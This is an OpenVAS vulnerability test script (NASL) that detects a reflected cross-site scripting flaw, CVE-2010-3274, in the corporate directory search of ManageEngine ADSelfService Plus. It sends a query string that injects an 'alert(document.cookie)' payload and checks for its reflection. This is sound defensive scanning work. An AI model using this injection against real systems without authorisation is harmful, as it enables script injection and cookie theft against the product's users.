###############################################################################
# OpenVAS Vulnerability Test
#
# Zoho ManageEngine ADSelfService Plus Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902757");
  script_version("2020-08-24T15:18:35+0000");
  script_cve_id("CVE-2010-3274");
  script_bugtraq_id(50717);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-11-18 11:15:15 +0530 (Fri, 18 Nov 2011)");
  script_name("Zoho ManageEngine ADSelfService Plus Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520562");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107093/vrpth-2011-001.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8888);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to terminate
  javascript variable declarations, escape encapsulation, and append arbitrary javascript code.");

  script_tag(name:"affected", value:"ManageEngine ADSelfServicePlus version 4.5 Build 4521");

  script_tag(name:"insight", value:"The flaw is due to an error in corporate directory search
  feature, which allows remote attackers to cause XSS attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Zoho ManageEngine ADSelfService Plus and is
  prone to cross site scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:8888);

foreach dir (make_list_unique("/", "/manageengine", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item: dir + "/EmployeeSearch.cc", port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if("<title>ManageEngine - ADSelfService Plus</title>" >< rcvRes)
  {
    url = string (dir + '/EmployeeSearch.cc?searchType=contains&searchBy=' +
                    'ALL_FIELDS&searchString=";alert(document.cookie);"');

    if(http_vuln_check(port:port, url:url, pattern:";alert\(document.cookie\);", check_header:TRUE))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
